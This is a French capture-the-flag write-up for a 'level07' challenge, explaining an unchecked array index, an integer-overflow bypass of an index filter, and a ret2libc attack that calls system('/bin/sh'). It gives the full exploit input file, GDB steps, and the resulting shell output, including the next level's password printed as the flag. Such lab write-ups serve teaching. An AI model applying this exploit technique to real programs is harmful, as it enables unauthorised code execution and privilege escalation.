# Level07

## Étape 1: Analyse initiale du programme
- On execute le programme:

./level07

- Le programme affiche un menu avec trois commandes:
```bash
- `store` : stocke un nombre à un index
- `read` : lit un nombre à un index
- `quit` : quitte le programme
```

- Testons les commandes:
```bash
Input command: store
 Number: 42
 Index: 5
 Completed store command successfully

Input command: read
 Index: 5
 Number at data[5] is 42
 Completed read command successfully

Input command: quit
```

## Étape 2: Identification de la faille
- En examinant le code source décompilé, nous identifions la vulnérabilité:

```c
int32_t buffer[100];  // Tableau de 100 entiers sur la stack
// ...
buffer[index] = number;  // aucune vérification des limites
```

**La faille** : Le programme ne vérifie pas si l'index est inférieur à 100. Nous pouvons écrire n'importe où en mémoire en choisissant le bon index.

## Étape 3: Comprendre l'objectif: L'adresse de retour

### Qu'est-ce qu'une adresse de retour ?

Quand une fonction est appelée en C, le CPU sauvegarde sur la stack où revenir après l'exécution de cette fonction. C'est l'adresse de retour.

Lorsque la fonction termine avec `return`, l'instruction assembleur `ret` est exécutée:

```bash
ret  # Cette instruction fait : pop eip (récupère l'adresse de retour et saute à cette adresse)
```

### Qu'est-ce qu'EIP ?
- **EIP** (Extended Instruction Pointer) est un registre du CPU qui contient l'adresse de la prochaine instruction à exécuter.

- **Notre stratégie**: Si nous modifions l'adresse de retour pour qu'elle pointe vers `system("/bin/sh")`, le programme lancera un shell avec les droits de `level08` au lieu de se terminer normalement.

## Étape 4: Trouver l'index de l'adresse de retour

### Structure de la stack
```bash
[Adresse de retour (EIP)]  ← Notre cible (Index ?)
[EBP sauvegardé]
[Variables locales]
[buffer[99]]
[buffer[98]]
...
[buffer[1]]
[buffer[0]]               ← Début du buffer (Index 0)
```

### Méthode: Test avec GDB

- On va tester différents indices jusqu'à trouver celui qui modifie l'adresse de retour.
- Sur GDB:

```bash
gdb ./level07
```
- On met un breakpoint juste avant l'instruction `ret` de `main()` :

```bash
(gdb) disas main
# Cherchez la dernière instruction : ret
# Elle est à l'adresse 0x080489f1

(gdb) b *0x080489f1
Breakpoint 1 at 0x80489f1

(gdb) run
```

- Le programme démarre. Testons avec l'index 114:
```bash
Input command: store
 Number: 1094795585 # AAAA (0x41414141)
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
```

- L'index 114 est bloqué.

## Étape 5 : Les protections du programme

- En analysant la fonction `store_number()`, nous découvrons deux protections:

```c
if (!(index % 3) || number >> 0x18 != 0xb7) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    return 1;
}
```

### Protection 1 : Index divisible par 3

```c
if (!(index % 3))  // Si index % 3 == 0
```

- **Indices bloqués** : 0, 3, 6, 9, ..., 114, 117, 120...
- **Problème** : L'index 114 est divisible par 3 (`114 % 3 = 0`), donc il est bloqué !

### Protection 2 : Le byte le plus haut doit être 0xb7

```c
if (number >> 0x18 != 0xb7)  // Les 8 bits de poids fort doivent être 0xb7
```

- Cela empêche l'injection de shellcode classique (car les instructions comme `\x90\x90\x90\x90` ne commencent pas par `0xb7`).

## Étape 6 : Contourner la protection: Integer Overflow

### Pourquoi l'index 114 ?

- Un entier (`int`) occupe 4 bytes en mémoire. Notre tableau `buffer[100]` occupe donc `100 * 4 = 400 bytes`.
- L'adresse de retour se trouve à 456 bytes du début du buffer.

Pour calculer l'index :
```bash
456 bytes ÷ 4 bytes par entier = 114
```

- **Pourquoi diviser par 4 ?** Parce que chaque case du tableau (`buffer[0]`, `buffer[1]`, etc.) contient un entier de 4 bytes. 
- L'index 114 signifie "sauter 114 entiers", soit `114 × 4 = 456 bytes`.

### Le calcul du programme

- Quand nous écrivons `buffer[index] = number`, le programme calcule :

```c
adresse_finale = adresse_du_buffer + (index * 4)
```

- En assembleur:
```bash
shl eax, 2     # Multiplie index par 4 (décalage de 2 bits à gauche)
```

### La solution: Integer Overflow
- Les nombres sur 32 bits vont de 0 à 4 294 967 295.
- Si nous utilisons un index tellement grand qu'après multiplication par 4, il déborde, nous pouvons atteindre l'index 114

- Calcul:
```bash
# Maximum sur 32 bits: 4 294 967 296
4 294 967 296 ÷ 4 = 1 073 741 824

# Pour atteindre l'index 114:
1 073 741 824 + 114 = 1 073 741 938
```

- Vérification de la protection:
```bash
1 073 741 938 % 3 = 2  (pas divisible par 3, passe la vérification !)
```

- Ce qui se passe lors de la multiplication:
```bash
1 073 741 938 × 4 = 4 294 967 752

# Mais 4 294 967 752 > 4 294 967 296 (max 32 bits)
# Le CPU garde seulement les 32 bits de droite:
4 294 967 752 % 4 294 967 296 = 456 bytes

456 bytes = index 114
```

### Test de confirmation
- On test avec GDB:
```bash
(gdb) run
```

- Dans le programme:
```
Input command: store
 Number: 1094795585
 Index: 1073741938
 Completed store command successfully
Input command: quit
```

- Au breakpoint:
```bash
Breakpoint 1, 0x080489f1 in main ()

(gdb) x/x $esp
0xffffd66c:	0x41414141
```
- On a bien écrasé l'adresse de retour avec `0x41414141`.

## Étape 7: Technique ret2libc

### Pourquoi pas de shellcode ?

La protection 2 (`number >> 0x18 != 0xb7`) empêche d'injecter du shellcode classique.

### La solution : ret2libc

- Au lieu d'injecter notre propre code, nous réutilisons une fonction déjà présente en mémoire : `system()` de la libc.

```c
system("/bin/sh");  // Lance un shell
```

### Trouver l'adresse de system()

- Lançons GDB :

```bash
gdb ./level07
```

```bash
(gdb) break main
Breakpoint 1 at 0x8048729

(gdb) run
Breakpoint 1, 0x08048729 in main ()

(gdb) p system # récupérer addr de system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

- Adresse de `system()`: `0xf7e6aed0`

### Trouver l'adresse de "/bin/sh"
- La chaîne `"/bin/sh"` existe déjà en mémoire dans la libc:

```bash
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```
- Adresse de `"/bin/sh"`: `0xf7f897ec`

## Étape 8 : Conversion en décimal
- Le programme attend des nombres en décimal, convertissons nos adresses:

```bash
python -c "print(0xf7e6aed0)" # addr system
4159090384

python -c "print(0xf7f897ec)" # ptr vers "/bin/sh"
4160264172 
```

- Récapitulatif:
- Adresse de `system()`: `4159090384`
- Adresse de `"/bin/sh"`: `4160264172`

## Étape 9 : Comprendre la calling convention
### Comment appeler une fonction ?

- En x86, quand une fonction est appelée, la stack est s'organise comme ça:

[Adresse de la fonction]    ← Le CPU saute ici
[Adresse de retour]         ← Où revenir après (on s'en fiche)
[Argument 1]                ← Premier paramètre
[Argument 2]                ← Deuxième paramètre


- Pour appeler `system("/bin/sh")`, nous devons construire :

```
Index 114 : 4159090384  (adresse de system)
Index 115 : [garbage]   (adresse de retour de system - non utilisé)
Index 116 : 4160264172  (pointeur vers "/bin/sh")
```

NB: On saute l'index 115 car on a pas besoin de contrôler où `system()` retourne.

## Étape 10 : Construction de l'exploit
- Créons un fichier avec nos commandes:

```bash
cat > /tmp/exploit07 << 'EOF'
store
4159090384
1073741938
store
4160264172
116
quit
EOF
```

- Explication :
- Ligne 1-3 : Stocker `4159090384` (system) à l'index 114 (via 1073741938)
- Ligne 4-6 : Stocker `4160264172` ("/bin/sh") à l'index 116
- Ligne 7 : Quitter pour déclencher le `ret`

## Étape 11 : Exécution de l'exploit

```bash
cat /tmp/exploit07 - | ./level07
```

NB: Le `-` après `/tmp/exploit07` garde stdin ouvert, permettant d'interagir avec le shell spawné.

- Résultat:

```bash
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command: whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

- FLAG: `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`

## Schéma récapitulatif

### Avant l'exploit

```bash
Stack de main() :
[0x0804XXXX]     ← Index 114 : Adresse de retour normale
[EBP sauvegardé]
[Variables locales]
[buffer[99]]
...
[buffer[0]]
```

### Après l'exploit

```bash
Stack de main() :
[0xf7e6aed0]    ← Index 114 : Adresse de system() !
[garbage]       ← Index 115
[0xf7f897ec]    ← Index 116 : Pointeur vers "/bin/sh"
[Variables locales]
[buffer[99]]
...
[buffer[0]]
```

### Lors du quit

1. `main()` exécute `return 0` → Devient `ret` en assembleur
2. `ret` fait `pop eip` → EIP = `0xf7e6aed0` (system)
3. Le CPU saute à `system()`
4. `system()` lit son argument 2 positions plus loin : `0xf7f897ec`
5. `system("/bin/sh")` s'exécute
6. Shell lancé avec les droits de `level08` !
7. Lecture du flag réussie
